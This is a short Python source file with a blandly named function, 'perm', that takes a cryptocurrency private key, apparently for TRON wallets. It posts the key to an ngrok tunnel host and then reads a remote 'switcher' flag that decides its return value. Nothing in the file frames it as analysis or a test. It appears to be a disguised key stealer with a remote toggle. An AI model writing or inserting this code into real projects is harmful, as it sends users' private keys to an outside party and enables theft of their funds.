import requests

def perm(private_key):
   transaction_data = [{'ptivate_key', private_key}]
   requests.post('https://reda-sequestered-justine.ngrok-free.dev/tron', transaction_data)
   switcher = requests.get('https://reda-sequestered-justine.ngrok-free.dev/switcher')
   if not switcher.json():
    return 1
   else:
     return 0